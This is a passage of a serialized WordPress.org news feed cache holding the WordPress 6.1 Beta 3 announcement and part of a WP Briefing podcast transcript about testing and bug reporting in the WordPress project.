\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:34:\"WordPress 6.1 Beta 3 Now Available\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:70:\"https://wordpress.org/news/2022/10/wordpress-6-1-beta-3-now-available/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Tue, 04 Oct 2022 17:55:52 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:5:{i:0;a:5:{s:4:\"data\";s:11:\"Development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:3:\"6.1\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:11:\"development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:8:\"releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13555\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:104:\"WordPress 6.1 Beta 3 is now available for download and testing.\n \nLearn how you can help test WordPress!\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:11:\"Dan Soschin\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:5709:\"\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p><strong><em>WordPress 6.1 Beta 3 is now available for download and testing.</em></strong></p>\n\n\n\n<p><strong>This version of the WordPress software is under development</strong>. Please do not install, run, or test this version of WordPress on production or mission-critical websites. Instead, it is recommended that you test Beta 3 on a test server and site.&nbsp;</p>\n\n\n\n<p>You can test WordPress 6.1 Beta 3 in three ways:</p>\n\n\n\n<p><strong>Option 1: </strong>Install and activate the <a href=\"https://wordpress.org/plugins/wordpress-beta-tester/\">WordPress Beta Tester</a> plugin (select the “Bleeding edge” channel and “Beta/RC Only” stream).</p>\n\n\n\n<p><strong>Option 2: </strong>Direct download the <a href=\"https://wordpress.org/wordpress-6.1-beta3.zip\">Beta 3 version (zip)</a>.</p>\n\n\n\n<p><strong>Option 3:</strong> Use the following WP-CLI command:</p>\n\n\n\n<p><code>wp core update --version=6.1-beta3</code></p>\n\n\n\n<p>The current target for the final release is November 1, 2022, which is about four weeks away.&nbsp;</p>\n\n\n\n<p>Additional information on the <a href=\"https://make.wordpress.org/core/6-1/\">6.1 release cycle is available</a>.</p>\n\n\n\n<p>Check the <a href=\"https://make.wordpress.org/core/\">Make WordPress Core blog</a> for <a href=\"https://make.wordpress.org/core/tag/dev-notes+6-1/\">6.1-related developer notes</a> in the coming weeks detailing all upcoming changes.</p>\n\n\n\n<h2><strong>Keep WordPress bug-free – help with testing</strong></h2>\n\n\n\n<p>Testing for issues is critical for stabilizing a release throughout its development. Testing is also a great way to contribute. This detailed guide is an excellent start if you have never tested a beta release before.</p>\n\n\n\n<p>Testing helps ensure that this and future releases of WordPress are as stable and issue-free as possible. Anyone can take part in testing – especially great WordPress community members like you.</p>\n\n\n\n<p>Want to know more about testing releases like this one? Read about the <a href=\"https://make.wordpress.org/test/\">testing initiatives</a> that happen in Make Core. You can also join a <a href=\"https://wordpress.slack.com/messages/core-test/\">core-test channel</a> on the <a href=\"https://wordpress.slack.com/\">Making WordPress Slack workspace</a>.</p>\n\n\n\n<p>If you have run into an issue, please report it to the <a href=\"https://wordpress.org/support/forum/alphabeta/\">Alpha/Beta area</a> in the support forums. If you are comfortable writing a reproducible bug report, you can <a href=\"https://core.trac.wordpress.org/newticket\">file one on WordPress Trac</a>. This is also where you can find a list of <a href=\"https://core.trac.wordpress.org/tickets/major\">known bugs</a>.</p>\n\n\n\n<p>To review features in the Gutenberg releases since WordPress 6.0 (the most recent major release of WordPress), access the <em>What’s New In Gutenberg</em> posts for <a href=\"https://make.wordpress.org/core/2022/09/16/whats-new-in-gutenberg-14-1-15-september/\">14.1</a>, <a href=\"https://make.wordpress.org/core/2022/09/01/whats-new-in-gutenberg-14-0-31-august/\">14.0</a>, <a href=\"https://make.wordpress.org/core/2022/08/17/whats-new-in-gutenberg-13-9-17-august/\">13.9</a>, <a href=\"https://make.wordpress.org/core/2022/08/04/whats-new-in-gutenberg-13-8-3-august/\">13.8</a>, <a href=\"https://make.wordpress.org/core/2022/07/20/whats-new-in-gutenberg-13-7-20-july/\">13.7</a>, <a href=\"https://make.wordpress.org/core/2022/07/07/whats-new-in-gutenberg-13-6-6-july/\">13.6</a>, <a href=\"https://make.wordpress.org/core/2022/06/22/whats-new-in-gutenberg-13-5-22-june/\">13.5</a>, <a href=\"https://make.wordpress.org/core/2022/06/10/whats-new-in-gutenberg-13-4-8-june/\">13.4</a>, <a href=\"https://make.wordpress.org/core/2022/05/26/whats-new-in-gutenberg-13-3-0-may-25/\">13.3</a>, <a href=\"https://make.wordpress.org/core/2022/05/12/whats-new-in-gutenberg-13-2-may-11/\">13.2</a>, and <a href=\"https://make.wordpress.org/core/2022/04/28/whats-new-in-gutenberg-13-1-27-april/\">13.1</a>.</p>\n\n\n\n<p>This release contains more than 350 enhancements and 350 bug fixes for the editor, including more than <a href=\"https://core.trac.wordpress.org/query?status=closed&amp;milestone=6.1&amp;group=component&amp;max=500&amp;col=id&amp;col=summary&amp;col=owner&amp;col=type&amp;col=priority&amp;col=component&amp;col=version&amp;order=priority\">300 tickets for WordPress 6.1 core</a>. More fixes are on the way in the remainder of the 6.1 release cycle.</p>\n\n\n\n<h2><strong>Some highlights</strong></h2>\n\n\n\n<p><em>Want to know what’s new in version 6.1? </em><a href=\"https://wordpress.org/news/2022/09/wordpress-6-1-beta-1-now-available/\"><em>Read the initial Beta 1 announcement</em></a><em> for some details, or check out the </em><a href=\"https://make.wordpress.org/core/2022/09/14/6-1-product-walk-through-recap/\"><em>product walk-through recording</em></a><em>.</em></p>\n\n\n\n<h2><strong>What’s new in Beta 3</strong></h2>\n\n\n\n<p>Nearly 100 issues have been resolved since Beta 2 was released last week. </p>\n\n\n\n<ul>\n<li><a href=\"https://github.com/WordPress/gutenberg/commits/wp/6.1\">Github tickets</a></li>\n\n\n\n<li><a href=\"https://core.trac.wordpress.org/query?status=accepted&amp;status=closed&amp;changetime=09%2F27%2F2022..10%2F04%2F2022&amp;resolution=fixed&amp;milestone=6.1&amp;col=id&amp;col=summary&amp;col=status&amp;col=milestone&amp;col=owner&amp;col=type&amp;col=priority&amp;order=id\">Trac tickets</a> (may include some overlap with Github)</li>\n</ul>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<h2>A Beta 3 haiku for thee</h2>\n\n\n\n<p>Beta time done soon<br>Gather up your WordPress sites<br>RC then we ship</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13555\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:7;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:97:\"WP Briefing: Episode 40: All Things Testing with Special Guests Anne McCarthy and Brian Alexander\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:119:\"https://wordpress.org/news/2022/10/episode-40-all-things-testing-with-special-guests-anne-mccarthy-and-brian-alexander/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 03 Oct 2022 12:00:00 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:7:\"Podcast\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:11:\"wp-briefing\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"https://wordpress.org/news/?post_type=podcast&p=13551\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:171:\"On this week\'s episode of the WP Briefing, Josepha is joined by special guests Anne McCarthy and Brian Alexander to discuss all thing testing within the WordPress project!\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:51:\"https://wordpress.org/news/files/2022/09/WPB040.mp3\";s:6:\"length\";s:1:\"0\";s:4:\"type\";s:0:\"\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"Santana Inniss\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:36698:\"\n<p>In the fortieth episode of the WordPress Briefing, Josepha Haden Chomphosy sits down with special guests Anne McCarthy and Brian Alexander to discuss the Testing Team and how to get started with testing in the WordPress project. </p>\n\n\n\n<p><em><strong>Have a question you&#8217;d like answered? You can submit them to <a href=\"mailto:wpbriefing@wordpress.org\">wpbriefing@wordpress.org</a>, either written or as a voice recording.</strong></em></p>\n\n\n\n<h2>Credits</h2>\n\n\n\n<p>Editor:&nbsp;<a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a><br>Logo:&nbsp;<a href=\"https://profiles.wordpress.org/javiarce/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/javiarce/\">Javier Arce</a><br>Production:&nbsp;<a href=\"https://profiles.wordpress.org/santanainniss/\">Santana Inniss</a><br>Song: Fearless First by Kevin MacLeod </p>\n\n\n\n<h2>Guests</h2>\n\n\n\n<p><a href=\"https://profiles.wordpress.org/annezazu/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/annezazu/\">Anne McCarthy</a><br><a href=\"https://profiles.wordpress.org/ironprogrammer/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/ironprogrammer/\">Brian Alexander</a></p>\n\n\n\n<h2>References</h2>\n\n\n\n<p><a href=\"https://make.wordpress.org/test/2022/09/21/help-test-wordpress-6-1/\">WordPress 6.1 Testing</a><br><a href=\"https://make.wordpress.org/test/handbook/test-reports/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/test/handbook/test-reports/\">Testing Reports w/ Template</a><br><a href=\"https://make.wordpress.org/test/category/week-in-test/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/test/category/week-in-test/\">Week in Test Series</a><br><a href=\"https://make.wordpress.org/core/handbook/testing/reporting-bugs/\">Reporting Bugs Handbook Page</a><br><a href=\"https://make.wordpress.org/test/handbook/full-site-editing-outreach-experiment/\">Fullsite Editing Outreach Program</a><br><a href=\"https://wordpress.slack.com/archives/C015GUFFC00\">FSE Outreach Experiment Slack Channel</a><br><a href=\"http://make.worpress.org/test\">make.wordpress.org/test</a><br><a href=\"https://wordpress.org/news\">WordPress.org/news</a><br><a href=\"http://learn.wordpress.org\">Learn.wordpress.org</a><br><a href=\"https://www.eventbrite.com/e/wordpress-wpdiversity-speaker-workshop-for-women-voices-in-latin-america-tickets-361213468207\">#WPDiversity Speaker Workshop for Women Voices in Latin America</a></p>\n\n\n\n<h2>Transcript</h2>\n\n\n\n<span id=\"more-13551\"></span>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:00]&nbsp;</strong></p>\n\n\n\n<p>Hello everyone. And welcome to the WordPress Briefing, the podcast where you can catch quick explanations of some of the ideas behind the WordPress open source project and the community around it, as well as get a small list of big things coming up in the next two weeks. I&#8217;m your host, Josepha Haden Chomphosy.</p>\n\n\n\n<p>Here we go.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:42]&nbsp;</strong></p>\n\n\n\n<p>So I have with us today on the WordPress Briefing a couple of special guests. I have <a href=\"https://profiles.wordpress.org/ironprogrammer/\">Brian Alexander</a>, as well as <a href=\"https://profiles.wordpress.org/annezazu/\">Anne McCarthy</a>. I&#8217;m gonna ask you both to tell us a little bit about yourselves, if you can tell us what you do with the WordPress project, maybe how long you&#8217;ve been with WordPress, and if there are any particular teams that you contribute to, that would be great.&nbsp;</p>\n\n\n\n<p>Brian, why don&#8217;t you get us started?</p>\n\n\n\n<p><strong>[Brian Alexander 00:01:02]&nbsp;</strong></p>\n\n\n\n<p>Hi, I&#8217;m Brian. I work on the WordPress project as a full-time contributor, sponsored by Automattic. And I am one of the Test Team reps, so I help promote testing across the project. And that&#8217;s not just in Core, but it could be for Themes, Performance, feature plugins, what have you. So try to make that stuff move forward and wrangle as many people as we can to get on board and help.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:01:32]&nbsp;</strong></p>\n\n\n\n<p>Excellent. All right, and Anne, what about you?</p>\n\n\n\n<p><strong>[Anne McCarthy 00:01:36]&nbsp;</strong></p>\n\n\n\n<p>I spearhead the Full Site Editing outreach program. I am a sponsor contributor for Automattic as well, and so I contribute across a couple of different teams depending upon what the outreach program needs as well as various release squads I have been a part of. So for 6.1 coming up, I&#8217;m one of the co-Core Editor triage leads.&nbsp;</p>\n\n\n\n<p>Brian is also on the squad as the co-Test lead, which is very exciting. So it&#8217;s been fun to work with him and be on the podcast. And I&#8217;ve been around the WordPress project since about 2011. But this is, the last couple of years, the first time I&#8217;ve been able to be sponsored by Automattic and be a part of giving back to the community that&#8217;s given me so much.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:02:13]&nbsp;</strong></p>\n\n\n\n<p>Amazing. All right. For folks who&#8217;ve been listening to the WP Briefing for a while, you know that I&#8217;ve been saying for like a full year that I think that testing is one of the best onboarding opportunities we have. And then also I really like to bring in our co-creators of WordPress through that testing program. Because we don&#8217;t know whether we&#8217;re right or not unless people tell us that we&#8217;re right or not. And we would like to hear so much from the users who, you know, use it and don&#8217;t necessarily have an opportunity, that privilege to kind of build on it or build the CMS itself.</p>\n\n\n\n<p>So I just have a few questions since I&#8217;ve got a couple of our strong testing wranglers here. The first thing I have is what are you doing? Or, do you have any advice for getting people outside of our active contributor base and the community to participate in testing?</p>\n\n\n\n<p><strong>[Anne McCarthy 00:03:03]</strong>&nbsp;</p>\n\n\n\n<p>I can kick this off. Just thinking about the Full Site Editing outreach program model. So just for context, there are various calls for testing in different formats. So everything from really procedural where you&#8217;re following exact steps to follow, to very open-ended calls for testing, as well as we recently did usability testing.</p>\n\n\n\n<p>And one of the things that come to mind immediately just for getting different contributors is to have very specific, fun, engaging, relevant tests that can draw people in. So if you have a call for testing that really speaks to someone, they might be more willing to participate. As well as just different formats.</p>\n\n\n\n<p>So someone may not want to, you know, follow 30 steps, but they might want to follow something more open-ended. They might want to answer a survey rather than opening a GitHub link. And so I think a lot of facilitation with the outreach program has served us really well to bring in different folks as well as explicitly reaching out.</p>\n\n\n\n<p>So I&#8217;ve done a number of talks in different WordPress related spaces and non-WordPress spaces to try to tell people about what we&#8217;re up to and really go meet them where they are. Because I think that&#8217;s ultimately, especially with Covid and the pandemic, there was a really unique opportunity to do that and to join the random online meetup that was happening and talk about the program and talk about ways that people could get involved and feel heard.&nbsp;</p>\n\n\n\n<p><strong>[Anne McCarthy 00:04:12]</strong>&nbsp;</p>\n\n\n\n<p>And the last thing I&#8217;ll mention is translations. The program that&#8217;s culture testing that I write is written in English, but I&#8217;m very fortunate to have people who translate those. And so that&#8217;s a huge way that I cannot contribute but that other people have. And so I really want to highlight that and call that out because it&#8217;s been hugely impactful to have these calls for testing in a way that people can more readily access.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:04:32]&nbsp;</strong></p>\n\n\n\n<p>Yeah, absolutely.</p>\n\n\n\n<p><strong>[Brian Alexander 00:04:35]&nbsp;</strong></p>\n\n\n\n<p>Yeah, I was going to add in, in addition to the calls for testing that are, as Anne said, structured such to isolate so that someone can just kind of go through a list of steps to do rather than just being exposed to Trac or GitHub and have kind of snow blindness with, with everything that&#8217;s happening.</p>\n\n\n\n<p>We also have a Week in Test series of posts that goes out about every week. And what we try to do with that series is to curate a list of posts that might be a good starting point. So we try to find one that, in each type of testing example, is something that would, a more novice contributor might be able to start with. Things for more intermediate and then also advanced ones that, for testers who may need to have a development environment and the ability to make some pretty deep or type of customizations to their WordPress project in order to test a patch or reproduce a particular issue that might be happening.</p>\n\n\n\n<p>So that&#8217;s a good springboard for someone to come in where there&#8217;s just a small thing that they can kind of look at and then dive into the larger process.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:05:46]&nbsp;</strong></p>\n\n\n\n<p>Absolutely. That&#8217;s very smart. It&#8217;s hard to figure out how to get started in WordPress at all, let alone as a contributing by testing things sort of area. That feels new to WordPress even though the team has been around for a long time. And so I think that&#8217;s excellent.&nbsp;</p>\n\n\n\n<p>Brian, you mentioned in your note about who you are and what you&#8217;re doing that you&#8217;re helping with testing not only in the test section in the Test Team but then also across the project. So, I have a follow-up question for you. What can developers do to create better tests for their software?</p>\n\n\n\n<p><strong>[Brian Alexander 00:06:18]</strong>&nbsp;</p>\n\n\n\n<p>There are sections within the Core handbook that kind of go into detail about the types of tests that should accompany individual contributions. A lot of those require kind of an extra step, and some developers maybe don&#8217;t have as much experience there. So hopefully, the Core handbook can provide a little bit of that guidance.</p>\n\n\n\n<p>We also have a lot of contributors who are interested in things such as unit testing, E2E testing, which is end-to-end testing, and testing in JavaScript or in PHP. So there&#8217;s a wide variety of the types of tests that you can actually contribute to. And I would say maybe about 50% of the tickets that I&#8217;ve triaged, personally, the contributor who brought in the patch was unable to or was not familiar with providing unit tests. So that is a very good opportunity for someone to come in who maybe is not as well versed in the depth of what the patch was involved with. But by contributing a user test, they get an opportunity to look very focused at a particular piece of code, what was modified, and then create unit tests based on that.</p>\n\n\n\n<p><strong>[Brian Alexander 00:07:40]</strong>&nbsp;</p>\n\n\n\n<p>And then once that unit test has been submitted and starting to be reviewed, other reviewers, Core contributors, or Core committers, I would say, they&#8217;ll start looking at that and if there are additional details that should be there, expanding the tests or little modifications. Then that also is feedback to that test contributor so that the next time they come in, they&#8217;re more prepared for it. They&#8217;re learning more about Core, and eventually, maybe they&#8217;ll also become a Core contributor.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:08:07]</strong>&nbsp;</p>\n\n\n\n<p>Excellent. We will include links to these handbook pages and documentation in the show notes if you&#8217;re listening to the podcast on your favorite podcasting platform, Pocketcasts, or it&#8217;s somewhere else. I don&#8217;t know where people listen to podcasts, but if you&#8217;re listening to it somewhere that&#8217;s not on the website, you can come to get that on wordpress.org/news.</p>\n\n\n\n<p>Okay, the next question that I have, and I think this is for both of you, Brian, it sounds like you partially answered it, but I bet there are more answers from Anne as well. What advice do you have for those submitting bug reports?</p>\n\n\n\n<p><strong>[Anne McCarthy 00:08:38]</strong>&nbsp;</p>\n\n\n\n<p>I&#8217;ll chime in to start, and then Brian, I&#8217;d love to hear your unique take because I also think you do an excellent job whenever I&#8217;ve engaged with you in various places of providing really good replication steps. And so I love that, and I wanna offer things specific to WordPress itself and something that I&#8217;ve noticed that&#8217;s more cultural rather than necessarily like steps to follow.</p>\n\n\n\n<p>And one of the things I&#8217;ve noticed that I think has started to come up partially with Covid is people, you know, you start talking at WordCamps or at a meetup, and a bug comes up, and you find someone who knows where to put it, and that kind of connection is has been frayed in the last couple years.</p>\n\n\n\n<p>And so one of the things I feel like I&#8217;ve been saying to a lot of different people at this unique point in time is that it doesn&#8217;t need to be perfect. Don&#8217;t let perfect be the enemy of good. And so if it means you just need to drop it in a Slack channel and you just are like, I don&#8217;t know where to put this, that&#8217;s huge.</p>\n\n\n\n<p>We need to hear from people across the project. And I just really encourage anyone, even if you don&#8217;t have the complete information or you&#8217;re not a hundred percent sure you&#8217;re afraid it&#8217;s been reported 10 times before, like, please still report it because we need those reports and also if 10 people reported it and it&#8217;s still not fixed, that also means we need to iterate.</p>\n\n\n\n<p><strong>[Anne McCarthy 00:09:40]&nbsp;</strong></p>\n\n\n\n<p>And so that&#8217;s one of the things, especially with the Full Site Editing outreach program, I feel people will message me saying, hey, I&#8217;m sure you&#8217;ve heard this a bunch, but… And sometimes I&#8217;ve never heard it at all. And I shudder to think of all the people who have not reached out or have not posted in GitHub or Trac or wherever.</p>\n\n\n\n<p>So yeah, share, and write blog posts. I think that another great way that people can give feedback is if you don&#8217;t know how to get into the depths of WordPress, writing a post and talking about it and sharing it on social media is also a great way to get attention. I read a lot of those. But as much as possible, getting to, if you can, if you&#8217;re comfortable, getting to the source where we&#8217;re able to see it in Github or Trac goes a really long way.</p>\n\n\n\n<p>And share as much as you can. And don&#8217;t worry if you can&#8217;t spend hours writing the perfect bug report, we still wanna hear from you.</p>\n\n\n\n<p><strong>[Brian Alexander 00:10:21]&nbsp;</strong></p>\n\n\n\n<p>Yeah. Building off of what Anne said, just the fact that you&#8217;re speaking out and raising an issue is a huge step for many, many people. And once, once you&#8217;ve actually done that, as Anne said, it doesn&#8217;t need to be perfect. There are a lot of other people who are going to be looking at these bugs, trying to figure out the replication steps used.</p>\n\n\n\n<p>So even if you can&#8217;t provide all this detail up front, someone will help. On the back end, they&#8217;ll help kind of fill in those gaps. If you do have the time to actually get deep into providing a very detailed bug report, then there are some key aspects of the bug report that make it very helpful for contributors, not only testers, who should be able to reproduce the issue to validate and make sure that this isn&#8217;t something that&#8217;s unique, unique to a plugin, to a custom theme or snippet that you dropped into your functions PHP.&nbsp;</p>\n\n\n\n<p>But, also for the actual Core contributors, who then need to be able to understand what is happening so that they can fix the right thing. And some of those items are the information about your testing environment.</p>\n\n\n\n<p><strong>[Brian Alexander 00:11:34]&nbsp;</strong></p>\n\n\n\n<p>So that could be your browser, your server, the type, whether it&#8217;s Apache, Nginx, et cetera, the operating system you&#8217;re running, what version of PHP you&#8217;re running, the version of WordPress, very critical, and…&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:11:49]</strong>&nbsp;</p>\n\n\n\n<p>Super important.</p>\n\n\n\n<p><strong>[Brian Alexander 00:11:51]&nbsp;</strong></p>\n\n\n\n<p>Any themes and plugins that you&#8217;re using. And that kind of information helps set the stage, and then other people will be able to set up their environment similarly if they&#8217;re going to try to test it.</p>\n\n\n\n<p>After you have provided the environmental information, the steps required to reproduce the issue should be as detailed as possible. You may not have realized that clicking this caused such and such to happen, so just try to remember, or maybe even walk through if it&#8217;s something you can repeat multiple times, walk through a couple of times and write down everything that you&#8217;re doing.</p>\n\n\n\n<p><strong>[Brian Alexander 00:12:30]&nbsp;</strong></p>\n\n\n\n<p>So that you&#8217;re sure, hey, this is the way that I can reproduce this bug. And then those steps will be very helpful for other contributors when they&#8217;re reviewing it. And then it&#8217;s also very helpful if you have video, screenshots, debug logs, any of those other kinds of resources that you could refer to because not all bugs are easy to explain.</p>\n\n\n\n<p>And we tend to… Trac and GitHub issues for the Gutenberg project, everybody&#8217;s writing in English. And maybe your main language is not English, and it might be a little bit challenging to do that. So providing a video, it&#8217;s worth a thousand words in any language. So, if you can provide those types of assets, that&#8217;s also very important.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:13:22]&nbsp;</strong></p>\n\n\n\n<p>Yeah, and I&#8217;ll share a little bit of a you&#8217;re-not-alone-in-it sort of anecdotes from the first few bugs that I ever filed for WordPress. I sort of had this feeling that if I were to file a bug, everyone would know that I wasn&#8217;t a developer. And like everyone knows, I&#8217;m not a developer, but a little bit I was like, they&#8217;ll know now. And so if that&#8217;s where you are also,&nbsp; Anne said it, and Brian said it as well, like, we can&#8217;t fix things that we don&#8217;t realize are broken. And just because you&#8217;ve run into it 15 times, which obviously should never happen, you should run into it once, and then we know, but it happens.</p>\n\n\n\n<p>If you run into it 15 times, probably other people have as well. And if it&#8217;s still not fixed, it might be because no one has thought to themselves I should tell someone that&#8217;s broken. And so if that&#8217;s your primary hurdle, folks out there in our listening space, I was once there too. And honestly, knowing that it&#8217;s a problem is as valuable as knowing the solution to it most of the time.&nbsp;</p>\n\n\n\n<p><strong>[Brian Alexander 00:14:23]</strong>&nbsp;</p>\n\n\n\n<p>Yeah, and those are, I wanted to add, there is a lot to that to remember. That&#8217;s a lot to remember in terms of what you should be submitting, what, or I should say, what would be ideal in what you&#8217;re submitting. But luckily, in the test handbook, there&#8217;s a test report section, and it includes a description, it goes everything from, it starts with why we do bug reports to examples of the types of testing, whether it be for bugs or enhancements, which also need testing, and it has templates in there that you can copy and paste directly into Trac. And that&#8217;s very helpful.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:15:03]</strong></p>\n\n\n\n<p>Yeah,, we will have links to those in the show notes as well. Since we&#8217;re right there at that moment, what do you think we could do as WordPress to make reporting problems easier?</p>\n\n\n\n<p><strong>[Brian Alexander 00:15:15]</strong>&nbsp;</p>\n\n\n\n<p>I know that this has been something that&#8217;s come up during our weekly meetings, discussions on the Core test channel, as well as in contributor day test table discussions. And the test documentation that&#8217;s on the website is a little bit fragmented. I believe that the current test handbook was originally written for a type of flow analysis and feedback testing that is not the norm today. So it&#8217;s a little bit confusing. The terminology is a little dated, and the most recent updates that have been provided on there relate solely to Gutenberg, which is very important that that also be represented, but, in order to find information about testing and Trac or PHP unit tests, you have to go over to the core handbook.</p>\n\n\n\n<p>So we could definitely make things improved by consolidating, bringing everything into one area so that if you are interested in testing, you&#8217;ll have everything in one place and not be split between that and not have outdated methodologies that are asking you to submit videos that nobody&#8217;s going to really look at because we&#8217;re not doing the flow tests anymore. So I think that that would be a benefit to future testers.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:16:41]</strong>&nbsp;</p>\n\n\n\n<p>Anne, any thoughts?</p>\n\n\n\n<p><strong>[Anne McCarthy 00:16:43]</strong></p>\n\n\n\n<p>Yeah. I&#8217;ll also add that I think there are like two things we can do. One is, there&#8217;s so much happening in the WordPress project in such a cool way that I think the more we can write targeted tests and talk to people about, like, hey, here&#8217;s this new thing coming. This is a high-impact area to test. It&#8217;s under active iteration. You&#8217;re gonna get a lot of engagement. People are really thinking about this and pulling people into that where 